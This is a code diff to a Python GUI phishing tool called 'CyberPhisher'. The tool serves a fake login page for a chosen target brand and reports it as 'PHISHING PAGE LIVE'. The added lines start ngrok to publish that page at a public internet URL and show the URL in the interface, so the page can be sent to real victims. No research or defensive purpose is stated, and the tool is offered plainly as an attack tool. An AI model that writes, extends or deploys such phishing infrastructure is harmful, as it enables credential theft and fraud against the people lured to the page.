@@ -1,6 +1,6 @@
 import tkinter as tk
 from tkinter import messagebox
-import threading, os, random, json, socket, subprocess, sys, string, hashlib
+import threading, os, random, json, socket, subprocess, sys, string, hashlib, shutil, time, urllib.request
 from datetime import datetime
 
 class CyberPhisher:
@@ -133,6 +133,23 @@ httpd.serve_forever()'''
         self.output.insert('end', f"\n{'='*50}\n  PHISHING PAGE LIVE\n  Target: {name}\n  Domain: {domain}:{port}\n  IP: {ip}:{port}\n{'='*50}\n")
         self.output.see('end')
         self.status.config(text=f"LIVE: {name}")
+        
+        # Try ngrok for public URL
+        if shutil.which("ngrok"):
+            try:
+                self.ngrok_process = subprocess.Popen(["ngrok", "http", str(port)], 
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                time.sleep(2)
+                try:
+                    import urllib.request
+                    with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=3) as r:
+                        tunnels = json.loads(r.read())
+                        public_url = tunnels["tunnels"][0]["public_url"]
+                        self.url_label.config(text=public_url, fg='#00ff88')
+                        self.url_detail.config(text=f"Page: {name} | Ngrok URL | LIVE", fg='#3fb950')
+                        self.output.insert('end', f"  Public URL: {public_url}\n")
+                except: pass
+            except: pass
         
         def monitor():
             try:
